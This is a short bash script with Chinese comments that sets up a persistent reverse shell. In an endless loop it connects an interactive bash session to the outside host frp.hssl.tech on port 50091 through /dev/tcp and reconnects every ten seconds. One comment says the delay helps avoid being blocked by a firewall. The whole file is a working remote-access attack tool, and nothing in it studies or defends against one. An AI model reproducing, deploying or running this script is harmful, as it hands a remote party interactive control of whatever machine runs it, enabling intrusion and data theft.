#!/bin/bash

# 这里的变量可以根据你的实际情况修改
REMOTE_HOST="frp.hssl.tech"
REMOTE_PORT="50091"

# 开启无限循环，确保连接断开后能自动重试
while true; do
    # 执行反弹 Shell 指令
    # /bin/bash -i 交互式模式
    # >& /dev/tcp/... 将标准输出和错误重定向到 socket
    # 0>&1 将标准输入也重定向到 socket
    /bin/bash -i >& /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0>&1
    
    # 连接断开后等待 10 秒，防止因频繁连接被防火墙封禁或耗尽资源
    sleep 10
done
